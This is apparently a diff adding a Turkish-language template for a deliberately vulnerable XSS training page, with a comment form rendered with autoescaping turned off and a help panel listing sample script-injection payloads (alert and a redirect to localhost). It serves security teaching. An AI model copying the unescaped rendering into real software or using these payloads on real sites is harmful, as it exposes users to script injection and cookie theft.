@@ -1,0 +1,82 @@
+{% extends "base.html" %}
+
+{% block body %}
+
+<div class="container">
+
+  <div class="panel panel-danger">
+    <div class="panel-heading"><p>Yorum Giriniz</p></div>
+    <div class="panel-body">
+     <form action="/xss" method="GET">
+      <div class="form-group">
+        <label>Yazar:</label>
+        <input type="text" class="form-control" id="yazar" name="yazar">
+        <br><br>
+        <label>Yorum:</label>
+        <textarea type="text" class="form-control" id="comment"  rows="5" name="yorum" required=""></textarea>
+      </div>
+      <button type="submit" class="btn btn-info pull-right">Yorum Gönder</button>
+    </form>
+    </div>
+  </div>
+  <div class="well text-center" style="background-color:#AFD8E3"><h4>YORUMLAR</h4></div>
+</div>
+{% autoescape false%}
+{% if yorumlar %}
+{% for yorum in yorumlar %}
+<br>
+<div class="container">
+  <div class="panel panel-danger">
+    <div class="panel-heading"><p> Yazar: {{ yorum['yazar'] }}</p></div>
+    <div class="panel-body">
+      {{ yorum['yorum'] }}
+    </div>
+  </div>
+</div>
+{% endfor %}
+{% endif %}
+{% endautoescape %}
+
+{% endblock body %}
+
+{% block yardim %}
+
+<div class="modal fade" id="myModal" role="dialog">
+  <div class="modal-dialog modal-lg">
+
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal">&times;</button>
+        <h4 class="modal-title">XSS Yardım</h4>
+      </div>
+      <div class="modal-body">
+        <h3>Açıklama </h3>
+        <br>
+        <p>Cross site scripting (XSS) HTML kodlarının arasına istemci tabanlı kod gömülmesi yoluyla kullanıcının tarayıcısında istenen istemci tabanlı kodun çalıştırılabilmesi olarak tanımlanır. XSS çoğunlukla tarayıcıda saklanan bilgiler olan cookielere saldırı amacı ile kullanılmaktadır. 3 Çeşit XSS Türü vardır. Bunlar Reflected XSS, Stored/Persistent XSS, Dom XSS'dir.</p>
+          <br>
+          <h3>Açığın Oluşma Sebebi</h3>
+          <br>
+          <img class="img-responsive" src="static/xss01.png">
+          <h3>Açığı Sömürü</h3>
+          <br>
+          <ul>
+            <li>Yorum: <b><span><</span>script<span>></span>alert('XSS');<span><</span>/script<span>></span></b></li>
+            <li>Yorum: <b> <span><</span>script<span>></span>document.location ="http://localhost:8080";<span><</span>/script<span>></span></b></li>
+            <li><b>http://localhost:8080/xss?yazar=&yorum=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E</b></li>
+            <li><b>http://localhost:8080/xss?yazar=&yorum=%3Cscript%3Edocument.location+%3D%22http%3A%2F%2Flocalhost%3A8080%22%3B%3C%2Fscript%3E</b></li>
+          </ul>
+          <br>
+          <h3>Açığın Kapatılması</h3>
+          <br>
+          <img class="img-responsive" src="static/xss02.png">
+          
+          <br>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Kapat</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+{% endblock %}
